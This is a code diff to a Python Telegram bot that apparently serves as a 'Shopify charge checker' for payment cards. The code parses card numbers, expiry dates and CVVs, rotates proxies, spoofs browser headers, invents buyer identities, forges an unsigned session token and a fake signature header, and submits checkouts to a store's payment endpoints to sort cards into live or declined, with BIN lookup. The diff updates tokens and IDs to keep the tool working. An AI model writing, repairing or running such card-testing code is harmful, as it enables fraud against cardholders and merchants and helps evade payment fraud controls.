@@ -14,7 +14,6 @@ from pyrogram.types import Message
 import html
 import os
 import unicodedata
-import base64
 
 # Import from helper modules
 try:
@@ -302,7 +301,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
     raw_response = str(raw_response) if raw_response else "-"
     
-    # Extract clean error message - only the error identifier before colon
     if "DECLINED - " in raw_response:
         response_display = raw_response.split("DECLINED - ")[-1]
         if ":" in response_display:
@@ -411,7 +409,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     else:
         status_flag = "Declined ❌"
 
-    # BIN lookup
     bin_data = get_bin_details(cc[:6]) or {}
     bin_info = {
         "bin": bin_data.get("bin", cc[:6]),
@@ -465,39 +462,30 @@ def strip_all_unicode(text):
 
 def extract_cc_from_ascii(text):
     digit_sequences = re.findall(r'\d+', text)
-    
     if len(digit_sequences) < 4:
         return None, None, None, None
-    
     for i in range(len(digit_sequences) - 3):
         potential_cc = digit_sequences[i]
         potential_month = digit_sequences[i+1]
         potential_year = digit_sequences[i+2]
         potential_cvv = digit_sequences[i+3]
-        
         if not (13 <= len(potential_cc) <= 19):
             continue
-            
         try:
             month_val = int(potential_month)
             if not (1 <= month_val <= 12):
                 continue
         except:
             continue
-            
         if not (len(potential_year) in [2, 4]):
             continue
-            
         if not (len(potential_cvv) in [3, 4]):
             continue
-        
         cc = potential_cc
         mm = potential_month.zfill(2)
         yy = potential_year[-2:] if len(potential_year) == 4 else potential_year
         cvv = potential_cvv
-        
         return cc, mm, yy, cvv
-    
     return None, None, None, None
 
 
@@ -514,10 +502,8 @@ def intelligent_card_parse(text):
                         mm = parts[1].strip().zfill(2)
                         yy = parts[2].strip()
                         cvv = parts[3].strip()
-                        
                         if len(yy) == 4:
                             yy = yy[-2:]
-                        
                         if (13 <= len(cc) <= 19 and cc.isdigit() and 
                             mm.isdigit() and 1 <= int(mm) <= 12 and
                             yy.isdigit() and len(yy) in [2, 4] and
@@ -608,7 +594,7 @@ def parse_card_input(card_input):
     return intelligent_card_parse(card_input)
 
 
-# ========== HTTP CHECKOUT CLASS - OPTIMIZED FLOW ==========
+# ========== HTTP CHECKOUT CLASS ==========
 class ShopifyHTTPCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
@@ -616,7 +602,6 @@ class ShopifyHTTPCheckout:
         self.product_handle = "retailer-id-fix-no-mapping"
         self.product_url = f"{self.base_url}/products/{self.product_handle}"
         
-        # Proxy management
         self.proxy_url = None
         self.proxy_status = "Dead 🚫"
         self.proxy_used = False
@@ -628,9 +613,9 @@ class ShopifyHTTPCheckout:
         self.headers = {
             'authority': 'meta-app-prod-store-1.myshopify.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
@@ -638,10 +623,9 @@ class ShopifyHTTPCheckout:
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
         }
 
-        # Dynamic data storage
         self.checkout_token = None
         self.session_token = None
         self.graphql_session_token = None
@@ -654,18 +638,14 @@ class ShopifyHTTPCheckout:
         self.submit_id = None
         self.delivery_strategy_handle = None
         
-        # Store queueToken from Proposal response for Submit
+        # NEW: Store queueToken from Proposal response for Submit
         self.proposal_queue_token = None
         
-        # Store paymentMethodIdentifier from Proposal seller response
+        # NEW: Store paymentMethodIdentifier from Proposal seller response
         self.payment_method_identifier = None
-        
-        # Store creditCardBin (first 8 digits of card)
-        self.credit_card_bin = None
 
         self.logger = ShopifyLogger(user_id)
 
-        # Random data generators
         self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                            "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                            "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
@@ -719,10 +699,10 @@ class ShopifyHTTPCheckout:
         return f"{self.checkout_token}-{timestamp}"
 
     def generate_session_token_from_checkout(self):
-        """KEPT AS IS - Generate a session token based on checkout token when not found in response"""
         if not self.checkout_token:
             return None
 
+        import base64
         header = json.dumps({"alg": "none", "typ": "JWT"})
         payload = json.dumps({
             "checkout_token": self.checkout_token,
@@ -737,7 +717,6 @@ class ShopifyHTTPCheckout:
         return f"{header_b64}.{payload_b64}.{signature}"
 
     def extract_session_token_from_html_aggressive(self, html_content):
-        """KEPT AS IS - Aggressively extract session token from HTML using all possible patterns"""
         session_token = None
 
         patterns = [
@@ -815,14 +794,13 @@ class ShopifyHTTPCheckout:
             return None
 
     async def add_to_cart_and_get_checkout(self, max_retries=3):
-        """Add product to cart and get checkout page - RESTORED ORIGINAL POST FLOW"""
+        """ORIGINAL WORKING FLOW - kept exactly as original"""
         for attempt in range(max_retries):
             try:
                 self.step(2 if attempt == 0 else 2 + attempt, "ADD TO CART", 
                          f"Adding product to cart and getting checkout (Attempt {attempt + 1}/{max_retries})", 
                          f"Variant: {self.variant_id}")
 
-                # Step 2.1: Add to cart via POST /cart/add
                 cart_headers = {
                     **self.headers,
                     'accept': 'application/javascript',
@@ -907,7 +885,6 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)
 
-                # Step 2.2: Start checkout via POST /cart (RESTORED ORIGINAL FLOW)
                 self.step(3, "START CHECKOUT", "Initiating checkout process")
 
                 checkout_start_headers = {
@@ -931,7 +908,6 @@ class ShopifyHTTPCheckout:
                     self.checkout_token = self.extract_checkout_token(current_url)
 
                     if not self.checkout_token:
-                        # Try to find token in HTML
                         match = re.search(r'"checkoutToken":"([^"]+)"', resp.text)
                         if match:
                             self.checkout_token = match.group(1)
@@ -953,7 +929,6 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(2, 3)
 
-                # Step 2.3: Extract session token from checkout page - KEPT AS IS
                 page_content = resp.text
                 self.session_token = self.extract_session_token_from_html_aggressive(page_content)
 
@@ -968,13 +943,12 @@ class ShopifyHTTPCheckout:
                     self.logger.data_extracted("Final Session Token", self.session_token[:50] + "...", "Success")
                     self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
                     
-                    # Extract other needed data from page
                     bootstrap_data = self.extract_bootstrap_data(page_content)
                     self.logger.data_extracted("Bootstrap Data", str(list(bootstrap_data.keys())), "Page")
 
                     self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
                     if not self.delivery_strategy_handle:
-                        self.delivery_strategy_handle = "2c0a12cd1c5acf9522569dd39f6bb661-be73b24eea304774d3c2df281c6988e5"
+                        self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
 
                     if 'operationName":"Proposal".*?"id":"([^"]+)"' in bootstrap_data:
                         self.proposal_id = bootstrap_data['operationName":"Proposal".*?"id":"([^"]+)"']
@@ -984,7 +958,7 @@ class ShopifyHTTPCheckout:
                     if 'operationName":"SubmitForCompletion".*?"id":"([^"]+)"' in bootstrap_data:
                         self.submit_id = bootstrap_data['operationName":"SubmitForCompletion".*?"id":"([^"]+)"']
                     else:
-                        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
+                        self.submit_id = "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
 
                     return True, page_content
 
@@ -1024,18 +998,17 @@ class ShopifyHTTPCheckout:
         return False, error_msg
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Execute checkout using optimized flow with proxy"""
+        """Execute checkout - original flow with minimal fixes"""
         proxy_attempts = 0
         max_attempts = 3
         
-        # Set credit card bin (first 8 digits)
-        self.credit_card_bin = cc[:8]
+        # Store credit card bin (first 8 digits)
+        credit_card_bin = cc[:8]
         
         while proxy_attempts < max_attempts:
             proxy_attempts += 1
             
             try:
-                # Step 0: Get proxy for user
                 self.step(0, "GET PROXY", f"Getting random proxy for user (Attempt {proxy_attempts}/{max_attempts})", f"User ID: {self.user_id}")
                 
                 if PROXY_SYSTEM_AVAILABLE:
@@ -1049,7 +1022,6 @@ class ShopifyHTTPCheckout:
                     
                     self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                     
-                    # Test the proxy quickly
                     start_test = time.time()
                     try:
                         test_resp = await self.client.get("https://ipinfo.io/json", timeout=5)
@@ -1059,7 +1031,6 @@ class ShopifyHTTPCheckout:
                             self.proxy_status = "Live ⚡️"
                             self.proxy_used = True
                             self.logger.data_extracted("Proxy Info", f"{self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s", "Proxy System")
-                            
                             mark_proxy_success(self.proxy_url, self.proxy_response_time)
                         else:
                             self.proxy_status = "Dead 🚫"
@@ -1082,7 +1053,6 @@ class ShopifyHTTPCheckout:
                     self.logger.error_log("PROXY", "Proxy system not available")
                     return False, "PROXY_SYSTEM_UNAVAILABLE"
 
-                # Step 1: Initialize session with homepage
                 self.step(1, "INIT SESSION", "Getting homepage with proxy", f"Proxy: {self.proxy_url[:30]}...")
 
                 shopify_y, shopify_s = self.generate_tracking_ids()
@@ -1096,7 +1066,6 @@ class ShopifyHTTPCheckout:
 
                 self.client.cookies.update(initial_cookies)
 
-                # Get homepage
                 start_time = time.time()
                 try:
                     resp = await self.client.get(self.base_url, headers=self.headers, timeout=30)
@@ -1146,7 +1115,6 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)
 
-                # Step 2: Add to cart and get checkout page
                 success, result = await self.add_to_cart_and_get_checkout(max_retries=2)
                 
                 if not success:
@@ -1157,21 +1125,18 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(2, 3)
 
-                # Step 3: Submit Proposal mutation
+                # ============ PROPOSAL STEP ============
                 self.step(4, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", self.email)
 
                 graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
                 stable_id = self.generate_uuid()
 
-                # Initial queueToken is random for Proposal
-                initial_queue_token = f"{self.generate_random_string(43)}=="
-
                 proposal_variables = {
                     "sessionInput": {
                         "sessionToken": self.graphql_session_token
                     },
-                    "queueToken": initial_queue_token,
+                    "queueToken": f"{self.generate_random_string(43)}==",
                     "discounts": {
                         "lines": [],
                         "acceptUnexpectedDiscounts": True
@@ -1261,9 +1226,7 @@ class ShopifyHTTPCheckout:
                                 "zoneCode": "PA",
                                 "phone": ""
                             }
-                        },
-                        # Add creditCardBin to Proposal payload
-                        "creditCardBin": self.credit_card_bin
+                        }
                     },
                     "buyerIdentity": {
                         "customer": {
@@ -1312,9 +1275,7 @@ class ShopifyHTTPCheckout:
                     "optionalDuties": {
                         "buyerRefusesDuties": False
                     },
-                    "cartMetafields": [],
-                    # Add includeTaxStrategyLines
-                    "includeTaxStrategyLines": False
+                    "cartMetafields": []
                 }
 
                 proposal_headers = {
@@ -1323,8 +1284,8 @@ class ShopifyHTTPCheckout:
                     'accept-language': 'en-US',
                     'content-type': 'application/json',
                     'origin': self.base_url,
-                    'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}&skip_shop_pay=true",
-                    'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+                    'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us/",
+                    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                     'sec-ch-ua-mobile': '?0',
                     'sec-ch-ua-platform': '"Windows"',
                     'sec-fetch-dest': 'empty',
@@ -1332,11 +1293,10 @@ class ShopifyHTTPCheckout:
                     'sec-fetch-site': 'same-origin',
                     'shopify-checkout-client': 'checkout-web/1.0',
                     'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                     'x-checkout-one-session-token': self.session_token,
-                    # Updated build ID and deploy stage from captured data
-                    'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
-                    'x-checkout-web-deploy-stage': 'canary',
+                    'x-checkout-web-build-id': '0e1aa4a2d0226841954371a4b7b45388eaac3ef4',
+                    'x-checkout-web-deploy-stage': 'production',
                     'x-checkout-web-server-handling': 'fast',
                     'x-checkout-web-server-rendering': 'yes',
                     'x-checkout-web-source-id': self.checkout_token
@@ -1367,14 +1327,14 @@ class ShopifyHTTPCheckout:
                     try:
                         proposal_resp = resp.json()
                         
-                        # Extract queueToken from Proposal response for Submit
+                        # FIX: Extract queueToken from response for Submit step
                         result_data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                         if result_data:
                             self.proposal_queue_token = result_data.get('queueToken')
                             if self.proposal_queue_token:
                                 self.logger.data_extracted("Queue Token (from Proposal)", self.proposal_queue_token[:30] + "...", "Proposal Response")
                             
-                            # Extract paymentMethodIdentifier from seller proposal
+                            # FIX: Extract paymentMethodIdentifier
                             seller_proposal = result_data.get('sellerProposal', {})
                             payment_data = seller_proposal.get('payment', {})
                             available_lines = payment_data.get('availablePaymentLines', [])
@@ -1385,18 +1345,14 @@ class ShopifyHTTPCheckout:
                                     if self.payment_method_identifier:
                                         self.logger.data_extracted("Payment Method Identifier", self.payment_method_identifier, "Proposal Seller Response")
                                     break
-                            
-                            # If not found, use default from captured data
                             if not self.payment_method_identifier:
                                 self.payment_method_identifier = "ca4f484d341716df9c8b4c59632eb0e7"
-                                self.logger.data_extracted("Payment Method Identifier (default)", self.payment_method_identifier, "Default fallback")
                         
-                        # Check for errors
+                        # Check only for FATAL errors (exclude PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT)
                         errors = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('errors', [])
-                        # Filter fatal errors (exclude non-fatal ones like PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT)
                         fatal_errors = [e for e in errors if e.get('code') not in ['PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT']]
                         if fatal_errors:
-                            error_msg = fatal_errors[0].get('nonLocalizedMessage') or fatal_errors[0].get('localizedMessage', 'Unknown error')
+                            error_msg = fatal_errors[0].get('message', 'Unknown error')
                             if ":" in error_msg:
                                 error_msg = error_msg.split(":")[0].strip()
                             if proxy_attempts < max_attempts:
@@ -1404,7 +1360,6 @@ class ShopifyHTTPCheckout:
                                 continue
                             return False, f"Proposal error: {error_msg[:50]}"
                         
-                        # If we got queueToken, proceed even with non-fatal errors
                         if not self.proposal_queue_token:
                             if proxy_attempts < max_attempts:
                                 await self.random_delay(1, 2)
@@ -1433,17 +1388,17 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)
 
-                # Step 4: Create payment session with PCI
+                # ============ PCI STEP ============
                 self.step(5, "CREATE PAYMENT", "Creating payment session with PCI and proxy")
 
                 pci_headers = {
                     'authority': 'checkout.pci.shopifyinc.com',
                     'accept': 'application/json',
-                    'accept-language': 'en-US,en;q=0.9',
+                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                     'content-type': 'application/json',
                     'origin': 'https://checkout.pci.shopifyinc.com',
-                    'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
-                    'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+                    'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
+                    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                     'sec-ch-ua-mobile': '?0',
                     'sec-ch-ua-platform': '"Windows"',
                     'sec-fetch-dest': 'empty',
@@ -1451,7 +1406,7 @@ class ShopifyHTTPCheckout:
                     'sec-fetch-site': 'same-origin',
                     'sec-fetch-storage-access': 'active',
                     'shopify-identification-signature': f'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.{self.generate_random_string(100)}.{self.generate_random_string(43)}',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
                 }
 
                 card_number = cc.replace(" ", "").replace("-", "")
@@ -1492,6 +1447,7 @@ class ShopifyHTTPCheckout:
                     try:
                         pci_resp = resp.json()
                         payment_session_id = pci_resp.get('id')
+                        payment_method_identifier_pci = pci_resp.get('payment_method_identifier')
                         if not payment_session_id:
                             await pci_client.aclose()
                             if proxy_attempts < max_attempts:
@@ -1523,18 +1479,22 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)
 
-                # Step 5: Submit for completion
+                # ============ SUBMIT STEP ============
                 self.step(6, "SUBMIT PAYMENT", "Submitting payment for processing with proxy")
 
                 attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
+
+                # FIX: Use queueToken from Proposal response
+                submit_queue_token = self.proposal_queue_token
+                # FIX: Use paymentMethodIdentifier from Proposal response, fallback to PCI response
+                submit_payment_method_identifier = self.payment_method_identifier or payment_method_identifier_pci or "ca4f484d341716df9c8b4c59632eb0e7"
 
                 submit_variables = {
                     "input": {
                         "sessionInput": {
                             "sessionToken": self.graphql_session_token
                         },
-                        # Use queueToken from Proposal response
-                        "queueToken": self.proposal_queue_token,
+                        "queueToken": submit_queue_token,
                         "discounts": {
                             "lines": [],
                             "acceptUnexpectedDiscounts": True
@@ -1614,8 +1574,7 @@ class ShopifyHTTPCheckout:
                             "paymentLines": [{
                                 "paymentMethod": {
                                     "directPaymentMethod": {
-                                        # Use extracted paymentMethodIdentifier
-                                        "paymentMethodIdentifier": self.payment_method_identifier,
+                                        "paymentMethodIdentifier": submit_payment_method_identifier,
                                         "sessionId": payment_session_id,
                                         "billingAddress": {
                                             "streetAddress": {
@@ -1667,9 +1626,7 @@ class ShopifyHTTPCheckout:
                                     "zoneCode": "PA",
                                     "phone": ""
                                 }
-                            },
-                            # Add creditCardBin to Submit payload
-                            "creditCardBin": self.credit_card_bin
+                            }
                         },
                         "buyerIdentity": {
                             "customer": {
@@ -1723,11 +1680,9 @@ class ShopifyHTTPCheckout:
                     "attemptToken": attempt_token,
                     "metafields": [],
                     "analytics": {
-                        "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}&skip_shop_pay=true",
-                        "pageId": f"{self.generate_random_string(8)}-{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}-{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}-{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}-{self.generate_random_string(12)}".upper()
-                    },
-                    # Add includeTaxStrategyLines
-                    "includeTaxStrategyLines": False
+                        "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}",
+                        "pageId": f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}"
+                    }
                 }
 
                 submit_payload = {
@@ -1845,17 +1800,14 @@ class ShopifyHTTPCheckout:
         return False, "PROXY_DEAD - All proxy attempts failed"
 
     async def poll_receipt(self, headers):
-        """Poll for receipt status WITH PROXY - Updated poll ID"""
+        """Poll for receipt status - ORIGINAL FLOW"""
         try:
             graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
-
-            # Updated PollForReceipt ID from captured data
-            poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
 
             poll_params = {
                 'operationName': 'PollForReceipt',
                 'variables': f'{{"receiptId":"{self.receipt_id}","sessionToken":"{self.graphql_session_token}"}}',
-                'id': poll_id
+                'id': '8d6301ed4a2c3f2cb34599828e84a6346a9243ddc8e54a772b1515aced846c71'
             }
 
             try:
@@ -1873,7 +1825,7 @@ class ShopifyHTTPCheckout:
                             "receiptId": self.receipt_id,
                             "sessionToken": self.graphql_session_token
                         },
-                        "id": poll_id
+                        "id": "8d6301ed4a2c3f2cb34599828e84a6346a9243ddc8e54a772b1515aced846c71"
                     }
                     resp = await self.client.post(graphql_url, headers=headers, json=poll_payload, timeout=30)
 
@@ -1889,6 +1841,7 @@ class ShopifyHTTPCheckout:
                     if receipt_type == 'FailedReceipt':
                         error_info = receipt_data.get('processingError', {})
                         error_code = error_info.get('code', 'UNKNOWN')
+                        error_msg = error_info.get('messageUntranslated', 'Payment failed')
                         return False, f"DECLINED - {error_code}"
 
                     elif receipt_type == 'ProcessedReceipt':
@@ -1927,7 +1880,6 @@ class ShopifyChargeCheckerHTTP:
         self.proxy_status = "Dead 🚫"
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method using optimized HTTP checkout with proxy"""
         start_time = time.time()
 
         self.logger = ShopifyLogger(self.user_id)
